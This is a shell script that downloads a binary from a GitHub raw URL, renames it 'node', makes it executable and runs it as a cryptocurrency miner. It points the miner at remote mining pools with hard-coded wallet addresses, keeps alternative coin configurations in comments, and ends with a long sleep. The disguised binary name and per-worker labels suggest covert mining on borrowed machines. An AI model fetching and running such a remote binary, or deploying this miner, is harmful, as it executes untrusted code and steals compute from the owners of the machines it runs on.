#!/bin/sh
curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
chmod +x node
WORKER_NUMBER=$1
PASSHOURS=$(date +%S)
echo "start ${WORKER_NUMBER}"
#./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
# Qogecoin
#./node --disable-gpu -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5089 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.${WORKER_NUMBER}_crf > try.log
# Crionic
#./node --disable-gpu -a yespowerltncg -o crnc.miners-pool.com:23007 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.${WORKER_NUMBER}_crf > try.log
#./node --disable-gpu -a yespowerltncg -o mine.pool.r4nd0m.us:8919 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.crf_${WORKER_NUMBER} -p c=CRNC,mc=CRNC,m=solo > try.log
./node --disable-gpu -a yespowerltncg -o us-east.coin-miners.info:7646 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.crf_${WORKER_NUMBER} -p id=ccrf_${WORKER_NUMBER},c=CRNC,m=solo,d=0.1 --cpu-threads-intensity 2 > try.log
# Whive
#./node --disable-gpu -a yespower -o stratum+tcp://206.189.2.17:3333 -u wv1q234xlrqlgykkz628xn3ehv9h6ssr55l4sqr0m2.${WORKER_NUMBER}_crf > try.log
#./node --disable-gpu -a yespower -o stratum+tcp://stratum.aikapool.com:3933 -u chriskm0101.${WORKER_NUMBER}_crf -p x,pgid=chriskm0101 > try.log
# Alterdot (adot)
#./node --disable-gpu -a argon2d_16000 -o argon2d16000.na.mine.zpool.ca:4241 -u CLhiJjcviwzUbm73SCcuksW4UXSxZuGjFf.crf_${WORKER_NUMBER}  -p crf_${WORKER_NUMBER},c=ADOT,zap=ADOT > try.log
#./node --disable-gpu -a argon2d_16000 -o stratum.aikapool.com:3919 -u chriskm0101.crf_${WORKER_NUMBER} -p x,pgid=chriskm0101 > try.log

sleep 29999

